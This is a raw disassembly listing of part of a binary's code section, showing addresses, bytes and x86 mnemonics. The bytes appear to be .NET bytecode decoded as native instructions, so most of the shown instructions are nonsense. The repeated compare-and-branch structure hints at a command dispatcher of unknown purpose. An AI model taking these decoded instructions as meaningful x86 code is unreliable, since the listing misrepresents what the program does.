  40367d:	00 de                	add    %bl,%dh
  40367f:	0c 11                	or     $0x11,%al
  403681:	05 2c 07 11 04       	add    $0x411072c,%eax
  403686:	28 a8 00 00 0a dc    	sub    %ch,-0x23f60000(%eax)
  40368c:	2a 00                	sub    (%eax),%al
  40368e:	00 00                	add    %al,(%eax)
  403690:	01 28                	add    %ebp,(%eax)
  403692:	00 00                	add    %al,(%eax)
  403694:	02 00                	add    (%eax),%al
  403696:	2a 00                	sub    (%eax),%al
  403698:	70 9a                	jo     0x403634
  40369a:	00 0a                	add    %cl,(%edx)
  40369c:	00 00                	add    %al,(%eax)
  40369e:	00 00                	add    %al,(%eax)
  4036a0:	00 00                	add    %al,(%eax)
  4036a2:	24 00                	and    $0x0,%al
  4036a4:	82 a6 00 14 29 00 00 	andb   $0x0,0x291400(%esi)
  4036ab:	01 02                	add    %eax,(%edx)
  4036ad:	00 11                	add    %dl,(%ecx)
  4036af:	00 ab bc 00 0c 00    	add    %ch,0xc00bc(%ebx)
  4036b5:	00 00                	add    %al,(%eax)
  4036b7:	00 1b                	add    %bl,(%ebx)
  4036b9:	30 02                	xor    %al,(%edx)
  4036bb:	00 23                	add    %ah,(%ebx)
  4036bd:	00 00                	add    %al,(%eax)
  4036bf:	00 20                	add    %ah,(%eax)
  4036c1:	00 00                	add    %al,(%eax)
  4036c3:	11 7e 13             	adc    %edi,0x13(%esi)
  4036c6:	00 00                	add    %al,(%eax)
  4036c8:	04 02                	add    $0x2,%al
  4036ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4036cb:	a9 00 00 0a 26       	test   $0x260a0000,%eax
  4036d0:	de 14 25 28 25 00 00 	ficoms 0x2528(,%eiz,1)
  4036d7:	0a 0a                	or     (%edx),%cl
  4036d9:	16                   	push   %ss
  4036da:	80 12 00             	adcb   $0x0,(%edx)
  4036dd:	00 04 28             	add    %al,(%eax,%ebp,1)
  4036e0:	27                   	daa
  4036e1:	00 00                	add    %al,(%eax)
  4036e3:	0a de                	or     %dh,%bl
  4036e5:	00 2a                	add    %ch,(%edx)
  4036e7:	00 01                	add    %al,(%ecx)
  4036e9:	10 00                	adc    %al,(%eax)
  4036eb:	00 00                	add    %al,(%eax)
  4036ed:	00 00                	add    %al,(%eax)
  4036ef:	00 0e                	add    %cl,(%esi)
  4036f1:	0e                   	push   %cs
  4036f2:	00 14 29             	add    %dl,(%ecx,%ebp,1)
  4036f5:	00 00                	add    %al,(%eax)
  4036f7:	01 1b                	add    %ebx,(%ebx)
  4036f9:	30 02                	xor    %al,(%edx)
  4036fb:	00 b6 00 00 00 21    	add    %dh,0x21000000(%esi)
  403701:	00 00                	add    %al,(%eax)
  403703:	11 7e 17             	adc    %edi,0x17(%esi)
  403706:	00 00                	add    %al,(%eax)
  403708:	04 2c                	add    $0x2c,%al
  40370a:	20 7e 17             	and    %bh,0x17(%esi)
  40370d:	00 00                	add    %al,(%eax)
  40370f:	04 6f                	add    $0x6f,%al
  403711:	aa                   	stos   %al,%es:(%edi)
  403712:	00 00                	add    %al,(%eax)
  403714:	0a 14 80             	or     (%eax,%eax,4),%dl
  403717:	17                   	pop    %ss
  403718:	00 00                	add    %al,(%eax)
  40371a:	04 de                	add    $0xde,%al
  40371c:	0e                   	push   %cs
  40371d:	25 28 25 00 00       	and    $0x2528,%eax
  403722:	0a 0a                	or     (%edx),%cl
  403724:	28 27                	sub    %ah,(%edi)
  403726:	00 00                	add    %al,(%eax)
  403728:	0a de                	or     %dh,%bl
  40372a:	00 7e 1a             	add    %bh,0x1a(%esi)
  40372d:	00 00                	add    %al,(%eax)
  40372f:	04 2c                	add    $0x2c,%al
  403731:	20 7e 1a             	and    %bh,0x1a(%esi)
  403734:	00 00                	add    %al,(%eax)
  403736:	04 6f                	add    $0x6f,%al
  403738:	aa                   	stos   %al,%es:(%edi)
  403739:	00 00                	add    %al,(%eax)
  40373b:	0a 14 80             	or     (%eax,%eax,4),%dl
  40373e:	1a 00                	sbb    (%eax),%al
  403740:	00 04 de             	add    %al,(%esi,%ebx,8)
  403743:	0e                   	push   %cs
  403744:	25 28 25 00 00       	and    $0x2528,%eax
  403749:	0a 0b                	or     (%ebx),%cl
  40374b:	28 27                	sub    %ah,(%edi)
  40374d:	00 00                	add    %al,(%eax)
  40374f:	0a de                	or     %dh,%bl
  403751:	00 7e 16             	add    %bh,0x16(%esi)
  403754:	00 00                	add    %al,(%eax)
  403756:	04 2c                	add    $0x2c,%al
  403758:	2a 7e 16             	sub    0x16(%esi),%bh
  40375b:	00 00                	add    %al,(%eax)
  40375d:	04 6f                	add    $0x6f,%al
  40375f:	ab                   	stos   %eax,%es:(%edi)
  403760:	00 00                	add    %al,(%eax)
  403762:	0a 7e 16             	or     0x16(%esi),%bh
  403765:	00 00                	add    %al,(%eax)
  403767:	04 6f                	add    $0x6f,%al
  403769:	9d                   	popf
  40376a:	00 00                	add    %al,(%eax)
  40376c:	0a 14 80             	or     (%eax,%eax,4),%dl
  40376f:	16                   	push   %ss
  403770:	00 00                	add    %al,(%eax)
  403772:	04 de                	add    $0xde,%al
  403774:	0e                   	push   %cs
  403775:	25 28 25 00 00       	and    $0x2528,%eax
  40377a:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  40377d:	27                   	daa
  40377e:	00 00                	add    %al,(%eax)
  403780:	0a de                	or     %dh,%bl
  403782:	00 7e 13             	add    %bh,0x13(%esi)
  403785:	00 00                	add    %al,(%eax)
  403787:	04 2c                	add    $0x2c,%al
  403789:	2a 7e 13             	sub    0x13(%esi),%bh
  40378c:	00 00                	add    %al,(%eax)
  40378e:	04 6f                	add    $0x6f,%al
  403790:	ac                   	lods   %ds:(%esi),%al
  403791:	00 00                	add    %al,(%eax)
  403793:	0a 7e 13             	or     0x13(%esi),%bh
  403796:	00 00                	add    %al,(%eax)
  403798:	04 6f                	add    $0x6f,%al
  40379a:	ad                   	lods   %ds:(%esi),%eax
  40379b:	00 00                	add    %al,(%eax)
  40379d:	0a 14 80             	or     (%eax,%eax,4),%dl
  4037a0:	13 00                	adc    (%eax),%eax
  4037a2:	00 04 de             	add    %al,(%esi,%ebx,8)
  4037a5:	0e                   	push   %cs
  4037a6:	25 28 25 00 00       	and    $0x2528,%eax
  4037ab:	0a 0d 28 27 00 00    	or     0x2728,%cl
  4037b1:	0a de                	or     %dh,%bl
  4037b3:	00 28                	add    %ch,(%eax)
  4037b5:	ae                   	scas   %es:(%edi),%al
  4037b6:	00 00                	add    %al,(%eax)
  4037b8:	0a 2a                	or     (%edx),%ch
  4037ba:	00 00                	add    %al,(%eax)
  4037bc:	01 34 00             	add    %esi,(%eax,%eax,1)
  4037bf:	00 00                	add    %al,(%eax)
  4037c1:	00 07                	add    %al,(%edi)
  4037c3:	00 12                	add    %dl,(%edx)
  4037c5:	19 00                	sbb    %eax,(%eax)
  4037c7:	0e                   	push   %cs
  4037c8:	29 00                	sub    %eax,(%eax)
  4037ca:	00 01                	add    %al,(%ecx)
  4037cc:	00 00                	add    %al,(%eax)
  4037ce:	2e 00 12             	add    %dl,%cs:(%edx)
  4037d1:	40                   	inc    %eax
  4037d2:	00 0e                	add    %cl,(%esi)
  4037d4:	29 00                	sub    %eax,(%eax)
  4037d6:	00 01                	add    %al,(%ecx)
  4037d8:	00 00                	add    %al,(%eax)
  4037da:	55                   	push   %ebp
  4037db:	00 1c 71             	add    %bl,(%ecx,%esi,2)
  4037de:	00 0e                	add    %cl,(%esi)
  4037e0:	29 00                	sub    %eax,(%eax)
  4037e2:	00 01                	add    %al,(%ecx)
  4037e4:	00 00                	add    %al,(%eax)
  4037e6:	86 00                	xchg   %al,(%eax)
  4037e8:	1c a2                	sbb    $0xa2,%al
  4037ea:	00 0e                	add    %cl,(%esi)
  4037ec:	29 00                	sub    %eax,(%eax)
  4037ee:	00 01                	add    %al,(%ecx)
  4037f0:	1b 30                	sbb    (%eax),%esi
  4037f2:	02 00                	add    (%eax),%al
  4037f4:	29 00                	sub    %eax,(%eax)
  4037f6:	00 00                	add    %al,(%eax)
  4037f8:	00 00                	add    %al,(%eax)
  4037fa:	00 00                	add    %al,(%eax)
  4037fc:	7e 1c                	jle    0x40381a
  4037fe:	00 00                	add    %al,(%eax)
  403800:	04 2c                	add    $0x2c,%al
  403802:	13 7e 12             	adc    0x12(%esi),%edi
  403805:	00 00                	add    %al,(%eax)
  403807:	04 2c                	add    $0x2c,%al
  403809:	0c 7e                	or     $0x7e,%al
  40380b:	1b 00                	sbb    (%eax),%eax
  40380d:	00 04 17             	add    %al,(%edi,%edx,1)
  403810:	d6                   	salc
  403811:	80 1b 00             	sbbb   $0x0,(%ebx)
  403814:	00 04 de             	add    %al,(%esi,%ebx,8)
  403817:	0c 28                	or     $0x28,%al
  403819:	25 00 00 0a 28       	and    $0x280a0000,%eax
  40381e:	27                   	daa
  40381f:	00 00                	add    %al,(%eax)
  403821:	0a de                	or     %dh,%bl
  403823:	00 2a                	add    %ch,(%edx)
  403825:	00 00                	add    %al,(%eax)
  403827:	00 01                	add    %al,(%ecx)
  403829:	10 00                	adc    %al,(%eax)
  40382b:	00 00                	add    %al,(%eax)
  40382d:	00 00                	add    %al,(%eax)
  40382f:	00 1c 1c             	add    %bl,(%esp,%ebx,1)
  403832:	00 0c 29             	add    %cl,(%ecx,%ebp,1)
  403835:	00 00                	add    %al,(%eax)
  403837:	01 1b                	add    %ebx,(%ebx)
  403839:	30 03                	xor    %al,(%ebx)
  40383b:	00 5d 00             	add    %bl,0x0(%ebp)
  40383e:	00 00                	add    %al,(%eax)
  403840:	22 00                	and    (%eax),%al
  403842:	00 11                	add    %dl,(%ecx)
  403844:	7e 12                	jle    0x403858
  403846:	00 00                	add    %al,(%eax)
  403848:	04 2c                	add    $0x2c,%al
  40384a:	45                   	inc    %ebp
  40384b:	1b 8d 26 00 00 01    	sbb    0x1000026(%ebp),%ecx
  403851:	0b 07                	or     (%edi),%eax
  403853:	16                   	push   %ss
  403854:	72 2d                	jb     0x403883
  403856:	08 00                	or     %al,(%eax)
  403858:	70 a2                	jo     0x4037fc
  40385a:	07                   	pop    %es
  40385b:	17                   	pop    %ss
  40385c:	7e 0a                	jle    0x403868
  40385e:	00 00                	add    %al,(%eax)
  403860:	04 a2                	add    $0xa2,%al
  403862:	07                   	pop    %es
  403863:	18 28                	sbb    %ch,(%eax)
  403865:	6b 00 00             	imul   $0x0,(%eax),%eax
  403868:	06                   	push   %es
  403869:	a2 07 19 7e 0a       	mov    %al,0xa7e1907
  40386e:	00 00                	add    %al,(%eax)
  403870:	04 a2                	add    $0xa2,%al
  403872:	07                   	pop    %es
  403873:	1a 7e 31             	sbb    0x31(%esi),%bh
  403876:	00 00                	add    %al,(%eax)
  403878:	04 a2                	add    $0xa2,%al
  40387a:	07                   	pop    %es
  40387b:	28 36                	sub    %dh,(%esi)
  40387d:	00 00                	add    %al,(%eax)
  40387f:	0a 28                	or     (%eax),%ch
  403881:	2f                   	das
  403882:	00 00                	add    %al,(%eax)
  403884:	06                   	push   %es
  403885:	17                   	pop    %ss
  403886:	80 1c 00 00          	sbbb   $0x0,(%eax,%eax,1)
  40388a:	04 28                	add    $0x28,%al
  40388c:	ae                   	scas   %es:(%edi),%al
  40388d:	00 00                	add    %al,(%eax)
  40388f:	0a de                	or     %dh,%bl
  403891:	0e                   	push   %cs
  403892:	25 28 25 00 00       	and    $0x2528,%eax
  403897:	0a 0a                	or     (%edx),%cl
  403899:	28 27                	sub    %ah,(%edi)
  40389b:	00 00                	add    %al,(%eax)
  40389d:	0a de                	or     %dh,%bl
  40389f:	00 2a                	add    %ch,(%edx)
  4038a1:	00 00                	add    %al,(%eax)
  4038a3:	00 01                	add    %al,(%ecx)
  4038a5:	10 00                	adc    %al,(%eax)
  4038a7:	00 00                	add    %al,(%eax)
  4038a9:	00 00                	add    %al,(%eax)
  4038ab:	00 4e 4e             	add    %cl,0x4e(%esi)
  4038ae:	00 0e                	add    %cl,(%esi)
  4038b0:	29 00                	sub    %eax,(%eax)
  4038b2:	00 01                	add    %al,(%ecx)
  4038b4:	22 28                	and    (%eax),%ch
  4038b6:	33 00                	xor    (%eax),%eax
  4038b8:	00 06                	add    %al,(%esi)
  4038ba:	2b 00                	sub    (%eax),%eax
  4038bc:	2a 00                	sub    (%eax),%al
  4038be:	00 00                	add    %al,(%eax)
  4038c0:	3a 02                	cmp    (%edx),%al
  4038c2:	74 09                	je     0x4038cd
  4038c4:	00 00                	add    %al,(%eax)
  4038c6:	1b 28                	sbb    (%eax),%ebp
  4038c8:	2e 00 00             	add    %al,%cs:(%eax)
  4038cb:	06                   	push   %es
  4038cc:	2b 00                	sub    (%eax),%eax
  4038ce:	2a 00                	sub    (%eax),%al
  4038d0:	1e                   	push   %ds
  4038d1:	02 28                	add    (%eax),%ch
  4038d3:	17                   	pop    %ss
  4038d4:	00 00                	add    %al,(%eax)
  4038d6:	0a 2a                	or     (%edx),%ch
  4038d8:	1b 30                	sbb    (%eax),%esi
  4038da:	08 00                	or     %al,(%eax)
  4038dc:	d0 07                	rolb   $1,(%edi)
  4038de:	00 00                	add    %al,(%eax)
  4038e0:	23 00                	and    (%eax),%eax
  4038e2:	00 11                	add    %dl,(%ecx)
  4038e4:	02 28                	add    (%eax),%ch
  4038e6:	75 00                	jne    0x4038e8
  4038e8:	00 06                	add    %al,(%esi)
  4038ea:	28 6d 00             	sub    %ch,0x0(%ebp)
  4038ed:	00 06                	add    %al,(%esi)
  4038ef:	7e 0a                	jle    0x4038fb
  4038f1:	00 00                	add    %al,(%eax)
  4038f3:	04 15                	add    $0x15,%al
  4038f5:	16                   	push   %ss
  4038f6:	28 af 00 00 0a 0a    	sub    %ch,0xa0a0000(%edi)
  4038fc:	06                   	push   %es
  4038fd:	16                   	push   %ss
  4038fe:	9a 13 13 11 13 72 39 	lcall  $0x3972,$0x13111313
  403905:	08 00                	or     %al,(%eax)
  403907:	70 16                	jo     0x40391f
  403909:	28 5b 00             	sub    %bl,0x0(%ebx)
  40390c:	00 0a                	add    %cl,(%edx)
  40390e:	16                   	push   %ss
  40390f:	33 2f                	xor    (%edi),%ebp
  403911:	16                   	push   %ss
  403912:	80 1c 00 00          	sbbb   $0x0,(%eax,%eax,1)
  403916:	04 72                	add    $0x72,%al
  403918:	39 08                	cmp    %ecx,(%eax)
  40391a:	00 70 7e             	add    %dh,0x7e(%eax)
  40391d:	0a 00                	or     (%eax),%al
  40391f:	00 04 7e             	add    %al,(%esi,%edi,2)
  403922:	1b 00                	sbb    (%eax),%eax
  403924:	00 04 28             	add    %al,(%eax,%ebp,1)
  403927:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403928:	00 00                	add    %al,(%eax)
  40392a:	0a 28                	or     (%eax),%ch
  40392c:	28 00                	sub    %al,(%eax)
  40392e:	00 0a                	add    %cl,(%edx)
  403930:	28 2f                	sub    %ch,(%edi)
  403932:	00 00                	add    %al,(%eax)
  403934:	06                   	push   %es
  403935:	16                   	push   %ss
  403936:	80 1b 00             	sbbb   $0x0,(%ebx)
  403939:	00 04 38             	add    %al,(%eax,%edi,1)
  40393c:	56                   	push   %esi
  40393d:	07                   	pop    %es
  40393e:	00 00                	add    %al,(%eax)
  403940:	11 13                	adc    %edx,(%ebx)
  403942:	72 43                	jb     0x403987
  403944:	08 00                	or     %al,(%eax)
  403946:	70 16                	jo     0x40395e
  403948:	28 5b 00             	sub    %bl,0x0(%ebx)
  40394b:	00 0a                	add    %cl,(%edx)
  40394d:	16                   	push   %ss
  40394e:	33 1a                	xor    (%edx),%ebx
  403950:	28 5d 00             	sub    %bl,0x0(%ebp)
  403953:	00 06                	add    %al,(%esi)
  403955:	28 77 00             	sub    %dh,0x0(%edi)
  403958:	00 06                	add    %al,(%esi)
  40395a:	28 b0 00 00 0a 16    	sub    %dh,0x160a0000(%eax)
  403960:	28 26                	sub    %ah,(%esi)
  403962:	00 00                	add    %al,(%eax)
  403964:	0a 38                	or     (%eax),%bh
  403966:	2c 07                	sub    $0x7,%al
  403968:	00 00                	add    %al,(%eax)
  40396a:	11 13                	adc    %edx,(%ebx)
  40396c:	72 4b                	jb     0x4039b9
  40396e:	08 00                	or     %al,(%eax)
  403970:	70 16                	jo     0x403988
  403972:	28 5b 00             	sub    %bl,0x0(%ebx)
  403975:	00 0a                	add    %cl,(%edx)
  403977:	16                   	push   %ss
  403978:	33 25 28 5d 00 00    	xor    0x5d28,%esp
  40397e:	06                   	push   %es
  40397f:	7e 13                	jle    0x403994
  403981:	00 00                	add    %al,(%eax)
  403983:	04 18                	add    $0x18,%al
  403985:	6f                   	outsl  %ds:(%esi),(%dx)
  403986:	b1 00                	mov    $0x0,%cl
  403988:	00 0a                	add    %cl,(%edx)
  40398a:	7e 13                	jle    0x40399f
  40398c:	00 00                	add    %al,(%eax)
  40398e:	04 6f                	add    $0x6f,%al
  403990:	ac                   	lods   %ds:(%esi),%al
  403991:	00 00                	add    %al,(%eax)
  403993:	0a 16                	or     (%esi),%dl
  403995:	28 26                	sub    %ah,(%esi)
  403997:	00 00                	add    %al,(%eax)
  403999:	0a 38                	or     (%eax),%bh
  40399b:	f7 06 00 00 11 13    	testl  $0x13110000,(%esi)
  4039a1:	72 57                	jb     0x4039fa
  4039a3:	08 00                	or     %al,(%eax)
  4039a5:	70 16                	jo     0x4039bd
  4039a7:	28 5b 00             	sub    %bl,0x0(%ebx)
  4039aa:	00 0a                	add    %cl,(%edx)
  4039ac:	16                   	push   %ss
  4039ad:	33 0d 16 14 14 28    	xor    0x28141416,%ecx
  4039b3:	46                   	inc    %esi
  4039b4:	00 00                	add    %al,(%eax)
  4039b6:	06                   	push   %es
  4039b7:	38 da                	cmp    %bl,%dl
  4039b9:	06                   	push   %es
  4039ba:	00 00                	add    %al,(%eax)
  4039bc:	11 13                	adc    %edx,(%ebx)
  4039be:	72 6b                	jb     0x403a2b
  4039c0:	08 00                	or     %al,(%eax)
  4039c2:	70 16                	jo     0x4039da
  4039c4:	28 5b 00             	sub    %bl,0x0(%ebx)
  4039c7:	00 0a                	add    %cl,(%edx)
  4039c9:	16                   	push   %ss
  4039ca:	33 1b                	xor    (%ebx),%ebx
  4039cc:	17                   	pop    %ss
  4039cd:	06                   	push   %es
  4039ce:	17                   	pop    %ss
  4039cf:	9a 06 18 9a 28 b2 00 	lcall  $0xb2,$0x289a1806
  4039d6:	00 0a                	add    %cl,(%edx)
  4039d8:	28 72 00             	sub    %dh,0x0(%edx)
  4039db:	00 06                	add    %al,(%esi)
  4039dd:	28 46 00             	sub    %al,0x0(%esi)
  4039e0:	00 06                	add    %al,(%esi)
  4039e2:	38 af 06 00 00 11    	cmp    %ch,0x11000006(%edi)
  4039e8:	13 72 79             	adc    0x79(%edx),%esi
  4039eb:	08 00                	or     %al,(%eax)
  4039ed:	70 16                	jo     0x403a05
  4039ef:	28 5b 00             	sub    %bl,0x0(%ebx)
  4039f2:	00 0a                	add    %cl,(%edx)
  4039f4:	16                   	push   %ss
  4039f5:	33 1a                	xor    (%edx),%ebx
  4039f7:	06                   	push   %es
  4039f8:	17                   	pop    %ss
  4039f9:	9a 06 18 9a 28 b2 00 	lcall  $0xb2,$0x289a1806
  403a00:	00 0a                	add    %cl,(%edx)
  403a02:	28 72 00             	sub    %dh,0x0(%edx)
  403a05:	00 06                	add    %al,(%esi)
  403a07:	28 41 00             	sub    %al,0x0(%ecx)
  403a0a:	00 06                	add    %al,(%esi)
  403a0c:	38 85 06 00 00 11    	cmp    %al,0x11000006(%ebp)
  403a12:	13 72 7f             	adc    0x7f(%edx),%esi
  403a15:	08 00                	or     %al,(%eax)
  403a17:	70 16                	jo     0x403a2f
  403a19:	28 5b 00             	sub    %bl,0x0(%ebx)
  403a1c:	00 0a                	add    %cl,(%edx)
  403a1e:	16                   	push   %ss
  403a1f:	33 18                	xor    (%eax),%ebx
  403a21:	06                   	push   %es
  403a22:	17                   	pop    %ss
  403a23:	9a 28 b2 00 00 0a 28 	lcall  $0x280a,$0xb228
  403a2a:	72 00                	jb     0x403a2c
  403a2c:	00 06                	add    %al,(%esi)
  403a2e:	28 42 00             	sub    %al,0x0(%edx)
  403a31:	00 06                	add    %al,(%esi)
  403a33:	26 38 5d 06          	cmp    %bl,%es:0x6(%ebp)
  403a37:	00 00                	add    %al,(%eax)
  403a39:	11 13                	adc    %edx,(%ebx)
  403a3b:	72 85                	jb     0x4039c2
  403a3d:	08 00                	or     %al,(%eax)
  403a3f:	70 16                	jo     0x403a57
  403a41:	28 5b 00             	sub    %bl,0x0(%ebx)
  403a44:	00 0a                	add    %cl,(%edx)
  403a46:	16                   	push   %ss
  403a47:	33 5d 17             	xor    0x17(%ebp),%ebx
  403a4a:	28 b3 00 00 0a 20    	sub    %dh,0x200a0000(%ebx)
  403a50:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403a53:	00 28                	add    %ch,(%eax)
  403a55:	b4 00                	mov    $0x0,%ah
  403a57:	00 0a                	add    %cl,(%edx)
  403a59:	20 0f                	and    %cl,(%edi)
  403a5b:	27                   	daa
  403a5c:	00 00                	add    %al,(%eax)
  403a5e:	28 b5 00 00 0a de    	sub    %dh,-0x21f60000(%ebp)
  403a64:	0c 28                	or     $0x28,%al
  403a66:	25 00 00 0a 28       	and    $0x280a0000,%eax
  403a6b:	27                   	daa
  403a6c:	00 00                	add    %al,(%eax)
  403a6e:	0a de                	or     %dh,%bl
  403a70:	00 28                	add    %ch,(%eax)
  403a72:	b6 00                	mov    $0x0,%dh
  403a74:	00 0a                	add    %cl,(%edx)
  403a76:	1c 28                	sbb    $0x28,%al
  403a78:	63 00                	arpl   %eax,(%eax)
  403a7a:	00 06                	add    %al,(%esi)
  403a7c:	06                   	push   %es
  403a7d:	17                   	pop    %ss
  403a7e:	9a 28 1f 00 00 0a 28 	lcall  $0x280a,$0x1f28
  403a85:	b7 00                	mov    $0x0,%bh
  403a87:	00 0a                	add    %cl,(%edx)
  403a89:	0b 73 51             	or     0x51(%ebx),%esi
  403a8c:	00 00                	add    %al,(%eax)
  403a8e:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  403a91:	06                   	push   %es
  403a92:	18 9a 07 6f b8 00    	sbb    %bl,0xb86f07(%edx)
  403a98:	00 0a                	add    %cl,(%edx)
  403a9a:	07                   	pop    %es
  403a9b:	28 b9 00 00 0a 26    	sub    %bh,0x260a0000(%ecx)
  403aa1:	38 f0                	cmp    %dh,%al
  403aa3:	05 00 00 11 13       	add    $0x13110000,%eax
  403aa8:	72 8b                	jb     0x403a35
  403aaa:	08 00                	or     %al,(%eax)
  403aac:	70 16                	jo     0x403ac4
  403aae:	28 5b 00             	sub    %bl,0x0(%ebx)
  403ab1:	00 0a                	add    %cl,(%edx)
  403ab3:	16                   	push   %ss
  403ab4:	33 0e                	xor    (%esi),%ecx
  403ab6:	06                   	push   %es
  403ab7:	17                   	pop    %ss
  403ab8:	9a 16 28 3d 00 00 06 	lcall  $0x600,$0x3d2816
  403abf:	38 d2                	cmp    %dl,%dl
  403ac1:	05 00 00 11 13       	add    $0x13110000,%eax
  403ac6:	72 9b                	jb     0x403a63
  403ac8:	08 00                	or     %al,(%eax)
  403aca:	70 16                	jo     0x403ae2
  403acc:	28 5b 00             	sub    %bl,0x0(%ebx)
  403acf:	00 0a                	add    %cl,(%edx)
  403ad1:	16                   	push   %ss
  403ad2:	33 0e                	xor    (%esi),%ecx
  403ad4:	06                   	push   %es
  403ad5:	17                   	pop    %ss
  403ad6:	9a 17 28 3d 00 00 06 	lcall  $0x600,$0x3d2817
  403add:	38 b4 05 00 00 11 13 	cmp    %dh,0x13110000(%ebp,%eax,1)
  403ae4:	72 ab                	jb     0x403a91
  403ae6:	08 00                	or     %al,(%eax)
  403ae8:	70 16                	jo     0x403b00
  403aea:	28 5b 00             	sub    %bl,0x0(%ebx)
  403aed:	00 0a                	add    %cl,(%edx)
  403aef:	16                   	push   %ss
  403af0:	33 13                	xor    (%ebx),%edx
  403af2:	72 c1                	jb     0x403ab5
  403af4:	08 00                	or     %al,(%eax)
  403af6:	70 16                	jo     0x403b0e
  403af8:	16                   	push   %ss
  403af9:	15 28 ba 00 00       	adc    $0xba28,%eax
  403afe:	0a 26                	or     (%esi),%ah
  403b00:	38 91 05 00 00 11    	cmp    %dl,0x11000005(%ecx)
  403b06:	13 72 f1             	adc    -0xf(%edx),%esi
  403b09:	08 00                	or     %al,(%eax)
  403b0b:	70 16                	jo     0x403b23
  403b0d:	28 5b 00             	sub    %bl,0x0(%ebx)
  403b10:	00 0a                	add    %cl,(%edx)
  403b12:	16                   	push   %ss
  403b13:	33 13                	xor    (%ebx),%edx
  403b15:	72 05                	jb     0x403b1c
  403b17:	09 00                	or     %eax,(%eax)
  403b19:	70 16                	jo     0x403b31
  403b1b:	16                   	push   %ss
  403b1c:	15 28 ba 00 00       	adc    $0xba28,%eax
  403b21:	0a 26                	or     (%esi),%ah
  403b23:	38 6e 05             	cmp    %ch,0x5(%esi)
  403b26:	00 00                	add    %al,(%eax)
  403b28:	11 13                	adc    %edx,(%ebx)
  403b2a:	72 35                	jb     0x403b61
  403b2c:	09 00                	or     %eax,(%eax)
  403b2e:	70 16                	jo     0x403b46
  403b30:	28 5b 00             	sub    %bl,0x0(%ebx)
  403b33:	00 0a                	add    %cl,(%edx)
  403b35:	16                   	push   %ss
  403b36:	33 13                	xor    (%ebx),%edx
  403b38:	72 47                	jb     0x403b81
  403b3a:	09 00                	or     %eax,(%eax)
  403b3c:	70 16                	jo     0x403b54
  403b3e:	16                   	push   %ss
  403b3f:	15 28 ba 00 00       	adc    $0xba28,%eax
  403b44:	0a 26                	or     (%esi),%ah
  403b46:	38 4b 05             	cmp    %cl,0x5(%ebx)
  403b49:	00 00                	add    %al,(%eax)
  403b4b:	11 13                	adc    %edx,(%ebx)
  403b4d:	72 67                	jb     0x403bb6
  403b4f:	09 00                	or     %eax,(%eax)
  403b51:	70 16                	jo     0x403b69
  403b53:	28 5b 00             	sub    %bl,0x0(%ebx)
  403b56:	00 0a                	add    %cl,(%edx)
  403b58:	16                   	push   %ss
  403b59:	33 11                	xor    (%ecx),%edx
  403b5b:	06                   	push   %es
  403b5c:	17                   	pop    %ss
  403b5d:	9a 16 16 15 28 ba 00 	lcall  $0xba,$0x28151616
  403b64:	00 0a                	add    %cl,(%edx)
  403b66:	26 38 2a             	cmp    %ch,%es:(%edx)
  403b69:	05 00 00 11 13       	add    $0x13110000,%eax
  403b6e:	72 79                	jb     0x403be9
  403b70:	09 00                	or     %eax,(%eax)
  403b72:	70 16                	jo     0x403b8a
  403b74:	28 5b 00             	sub    %bl,0x0(%ebx)
  403b77:	00 0a                	add    %cl,(%edx)
  403b79:	16                   	push   %ss
  403b7a:	33 42 7e             	xor    0x7e(%edx),%eax
  403b7d:	1f                   	pop    %ds
  403b7e:	00 00                	add    %al,(%eax)
  403b80:	04 6f                	add    $0x6f,%al
  403b82:	bb 00 00 0a de       	mov    $0xde0a0000,%ebx
  403b87:	0e                   	push   %cs
  403b88:	25 28 25 00 00       	and    $0x2528,%eax
  403b8d:	0a 0d 28 27 00 00    	or     0x2728,%cl
  403b93:	0a de                	or     %dh,%bl
  403b95:	00 14 fe             	add    %dl,(%esi,%edi,8)
  403b98:	06                   	push   %es
  403b99:	43                   	inc    %ebx
  403b9a:	00 00                	add    %al,(%eax)
  403b9c:	06                   	push   %es
  403b9d:	73 a1                	jae    0x403b40
  403b9f:	00 00                	add    %al,(%eax)
  403ba1:	0a 73 a2             	or     -0x5e(%ebx),%dh
  403ba4:	00 00                	add    %al,(%eax)
  403ba6:	0a 80 1f 00 00 04    	or     0x400001f(%eax),%al
  403bac:	7e 1f                	jle    0x403bcd
  403bae:	00 00                	add    %al,(%eax)
  403bb0:	04 06                	add    $0x6,%al
  403bb2:	17                   	pop    %ss
  403bb3:	9a 6f bc 00 00 0a 38 	lcall  $0x380a,$0xbc6f
  403bba:	d8 04 00             	fadds  (%eax,%eax,1)
  403bbd:	00 11                	add    %dl,(%ecx)
  403bbf:	13 72 8d             	adc    -0x73(%edx),%esi
  403bc2:	09 00                	or     %eax,(%eax)
  403bc4:	70 16                	jo     0x403bdc
  403bc6:	28 5b 00             	sub    %bl,0x0(%ebx)
  403bc9:	00 0a                	add    %cl,(%edx)
  403bcb:	16                   	push   %ss
  403bcc:	33 20                	xor    (%eax),%esp
  403bce:	7e 1f                	jle    0x403bef
  403bd0:	00 00                	add    %al,(%eax)
  403bd2:	04 6f                	add    $0x6f,%al
  403bd4:	bb 00 00 0a de       	mov    $0xde0a0000,%ebx
  403bd9:	0f 25                	(bad)
  403bdb:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  403be1:	04 28                	add    $0x28,%al
  403be3:	27                   	daa
  403be4:	00 00                	add    %al,(%eax)
  403be6:	0a de                	or     %dh,%bl
  403be8:	00 38                	add    %bh,(%eax)
  403bea:	a8 04                	test   $0x4,%al
  403bec:	00 00                	add    %al,(%eax)
  403bee:	11 13                	adc    %edx,(%ebx)
  403bf0:	72 9f                	jb     0x403b91
  403bf2:	09 00                	or     %eax,(%eax)
  403bf4:	70 16                	jo     0x403c0c
  403bf6:	28 5b 00             	sub    %bl,0x0(%ebx)
  403bf9:	00 0a                	add    %cl,(%edx)
  403bfb:	16                   	push   %ss
  403bfc:	33 43 7e             	xor    0x7e(%ebx),%eax
  403bff:	20 00                	and    %al,(%eax)
  403c01:	00 04 6f             	add    %al,(%edi,%ebp,2)
  403c04:	bb 00 00 0a de       	mov    $0xde0a0000,%ebx
  403c09:	0f 25                	(bad)
  403c0b:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  403c11:	05 28 27 00 00       	add    $0x2728,%eax
  403c16:	0a de                	or     %dh,%bl
